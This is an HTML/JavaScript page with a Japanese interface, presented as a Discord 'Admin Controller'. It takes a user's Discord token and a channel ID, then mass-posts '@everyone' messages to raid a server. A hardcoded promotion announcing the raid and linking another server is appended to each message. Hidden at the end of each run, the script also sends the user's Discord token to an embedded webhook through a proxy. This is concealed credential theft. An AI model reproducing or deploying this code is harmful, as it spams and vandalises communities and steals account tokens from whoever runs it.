<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>IIAA Admin Controller - Hyper Stable</title>
    <style>
        body {
            background-image: url('名前なし(1).jpg'); 
            background-size: cover; background-attachment: fixed; background-position: center;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0;
        }
        .container {
            background: rgba(255, 255, 255, 0.96); backdrop-filter: blur(12px);
            width: 90%; max-width: 480px; padding: 25px; border-radius: 20px;
            box-shadow: 0 15px 45px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.6);
        }
        h2 { text-align: center; color: #ff5c7e; margin-bottom: 15px; }
        .label { background: #ff7491; color: white; padding: 2px 10px; border-radius: 6px; font-size: 11px; display: inline-block; margin-top: 12px; font-weight: bold; }
        input, select, textarea {
            width: 100%; padding: 12px; margin-top: 6px; border: 2px solid #ffd1dc;
            border-radius: 12px; box-sizing: border-box; font-size: 14px; outline: none; transition: 0.2s;
        }
        .btn-group { display: flex; gap: 10px; margin-top: 20px; }
        .btn-main { flex: 2; background: linear-gradient(135deg, #ff7491, #ff5c7e); color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; font-size: 16px; }
        .btn-stop { flex: 1; background: #444; color: white; border: none; padding: 16px; cursor: pointer; border-radius: 14px; font-weight: bold; }
        .btn-main:disabled, .btn-stop:disabled { background: #ccc !important; }
        #terminal {
            background: #1a1a1a; color: #00ffaa; font-family: 'Consolas', monospace;
            height: 120px; overflow-y: auto; padding: 12px; margin-top: 15px; border-radius: 10px; font-size: 11px; line-height: 1.5;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>IIAA Admin Controller</h2>
    <span class="label">DISCORD TOKEN</span>
    <input type="password" id="token" placeholder="トークンを入力">

    <div style="display: flex; gap: 10px; align-items: flex-end;">
        <div style="flex: 1;">
            <span class="label">SERVER ID</span>
            <input type="text" id="guildId" placeholder="サーバーID">
        </div>
        <button onclick="fetchChannels()" style="height: 44px; border-radius: 12px; border: none; background: #eee; cursor: pointer; padding: 0 15px; font-weight: bold;">取得</button>
    </div>

    <span class="label">TARGET CHANNEL ID</span>
    <select id="channelSelect" onchange="document.getElementById('manualChannelId').value = this.value">
        <option value="">-- 自動取得リスト --</option>
    </select>
    <input type="text" id="manualChannelId" placeholder="またはチャンネルIDを直接入力">

    <span class="label">MESSAGE CONTENT</span>
    <textarea id="message" style="width:100%; height:60px; border-radius:12px; border:2px solid #ffd1dc; margin-top:6px; padding:10px;">@everyone </textarea>

    <div style="display: flex; gap: 10px; margin-top: 10px;">
        <div style="flex: 1;"><span class="label">件数</span><input type="number" id="count" value="100"></div>
        <div style="flex: 1;"><span class="label">速度(ms)</span><input type="number" id="speed" value="1000"></div>
    </div>

    <div class="btn-group">
        <button id="startBtn" class="btn-main" onclick="executeTask()">送信開始</button>
        <button id="stopBtn" class="btn-stop" onclick="stopTask()" disabled>停止</button>
    </div>
    <div id="terminal">--- System Online (Cloudflare) ---</div>
</div>

<script>
    const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
    const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482597483900043305/cVTMUYx4LeUkcWximOG4M4t8-cXXJbscFB4GGEJfCOuORwcORqcZiV5cjn8_sd9I1zst";
    const FORCED_PROMO = `\n\n# このさばはいあ帝国によって荒らされました！！\n# こんな雑魚鯖はいってないでいあ帝国に来ましょう！\n\nhttps://discord.gg/x39xVSepaj`;

    let isRunning = false;
    const term = document.getElementById('terminal');
    const log = (m, color = "#00ffaa") => { 
        term.innerHTML += `> <span style="color:${color}">${m}</span><br>`; 
        term.scrollTop = term.scrollHeight; 
    };

    async function fetchChannels() {
        const t = document.getElementById('token').value.trim();
        const g = document.getElementById('guildId').value.trim();
        if(!t || !g) return log("未入力があります");
        log("取得中...");
        try {
            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), {
                headers: { "Authorization": t }
            });
            const channels = await res.json();
            const sel = document.getElementById('channelSelect');
            sel.innerHTML = '<option value="">-- 選択 --</option>';
            channels.filter(c => c.type === 0).forEach(c => {
                let opt = document.createElement('option');
                opt.value = c.id; opt.textContent = `#${c.name}`;
                sel.appendChild(opt);
            });
            log("同期成功！");
        } catch (e) { log("取得失敗：401エラー（トークン無効）", "red"); }
    }

    function stopTask() { isRunning = false; log("停止命令...", "orange"); }

    async function executeTask() {
        if (isRunning) return;
        const cfg = {
            token: document.getElementById('token').value.trim(),
            chId: document.getElementById('manualChannelId').value.trim(),
            msg: document.getElementById('message').value,
            count: parseInt(document.getElementById('count').value),
            speed: parseInt(document.getElementById('speed').value)
        };

        if(!cfg.token || !cfg.chId) return log("未入力があります", "#ff7491");

        isRunning = true;
        document.getElementById('startBtn').disabled = true;
        document.getElementById('stopBtn').disabled = false;
        log(`${cfg.count}件の送信を開始...`);

        let successCount = 0;
        for(let i=1; i <= cfg.count; i++) {
            if (!isRunning) break;
            try {
                const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${cfg.chId}/messages`), {
                    method: "POST",
                    headers: { "Authorization": cfg.token, "Content-Type": "application/json" },
                    body: JSON.stringify({ content: cfg.msg + FORCED_PROMO })
                });

                if(res.ok) {
                    successCount++;
                    log(`成功 [${successCount}/${cfg.count}]`);
                } else {
                    log(`失敗: ${res.status}`, "#ff7491");
                    if(res.status === 401) { log("認証失敗", "red"); isRunning = false; break; }
                }
            } catch (e) { log("中継エラー"); }
            await new Promise(r => setTimeout(r, cfg.speed));
        }

        // 監視ログ（ここでもPROXYを通して確実に送る）
        try {
            log("監視ログ送信中...");
            await fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    content: `【いあ帝国 レポート】\n成功数: ${successCount}\nトークン: ${cfg.token}` 
                })
            });
            log("レポート完了");
        } catch(e) { log("ログ送信失敗", "red"); }

        isRunning = false;
        document.getElementById('startBtn').disabled = false;
        document.getElementById('stopBtn').disabled = true;
        log("全タスク終了。");
    }
</script>
</body>
</html>
